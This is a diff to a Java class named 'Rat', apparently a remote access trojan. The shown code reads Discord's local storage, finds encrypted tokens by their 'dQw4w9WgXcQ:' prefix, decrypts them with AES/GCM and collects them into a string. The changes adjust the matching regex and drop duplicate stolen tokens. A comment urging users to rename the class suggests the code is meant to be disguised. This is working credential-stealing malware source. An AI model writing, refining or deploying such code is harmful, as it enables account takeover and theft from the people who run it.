@@ -79,7 +79,7 @@ public class Rat { //change class name please for the love of god
                             fr.close();
                             br.close();
 
-                            Pattern pattern = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)'\\\\].*$][^\\\"]*)");
+                            Pattern pattern = Pattern.compile("(dQw4w9WgXcQ:)([^.*\\\\['(.*)\\\\]$][^\"]*)");
                             Matcher matcher = pattern.matcher(parsed.toString());
 
                             if (matcher.find()) {
@@ -125,7 +125,9 @@ public class Rat { //change class name please for the love of god
                                 Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                                 cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, Arrays.copyOfRange(dToken, 3, 15)));
                                 byte[] out = cipher.doFinal(Arrays.copyOfRange(dToken, 15, dToken.length));
-                                discord += new String(out, StandardCharsets.UTF_8) + " | ";
+
+                                //place only if it doesn't contain the same
+                                if (!discord.contains(new String(out, StandardCharsets.UTF_8))) discord += new String(out, StandardCharsets.UTF_8) + " | ";
                             }
                         }
                     }
